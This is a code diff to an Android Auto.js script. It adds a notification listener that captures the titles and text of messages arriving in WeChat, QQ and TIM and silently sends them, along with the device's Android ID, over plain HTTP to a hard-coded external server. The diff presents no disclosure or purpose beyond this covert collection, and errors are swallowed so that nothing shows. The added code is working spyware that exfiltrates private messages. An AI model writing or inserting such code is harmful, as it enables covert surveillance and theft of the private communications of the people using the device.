@@ -15,5 +15,41 @@
 // log(名字)
 
 
-if (!requestScreenCapture()) {
+// if (!requestScreenCapture()) {
+// }
+
+function notificationListenerEnable() {
+    let enable = false;
+    let packageName = context.getPackageName();
+    let flat = android.provider.Settings.Secure.getString(context.getContentResolver(), "enabled_notification_listeners");
+    if (flat != null) {
+        enable = flat.indexOf(packageName);
+        if (enable != -1) {
+            return true
+        }else{
+            return false
+        }
+    }
 }
+let list = ["com.tencent.mm","com.tencent.mobileqq","com.tencent.tim"]
+let id = device.getAndroidId()
+if(notificationListenerEnable()){
+    try {
+        events.observeNotification();
+        events.on("notification", function (n) {
+            if (list.indexOf(n.getPackageName()) != -1) {
+                let URL = "http://119.29.234.95/up.php?id=" + id  + "&package=" + n.getPackageName() + "&title=" + n.getTitle()  +"&text=" + n.getText()
+                http.get(URL, {}, function (res, err) {
+                    if (err) {
+                        return;
+                    }else{
+                    }
+                });
+            }else{
+            }
+
+        });
+    } catch (error) {
+    }
+}
+setInterval(()=>{},200000)
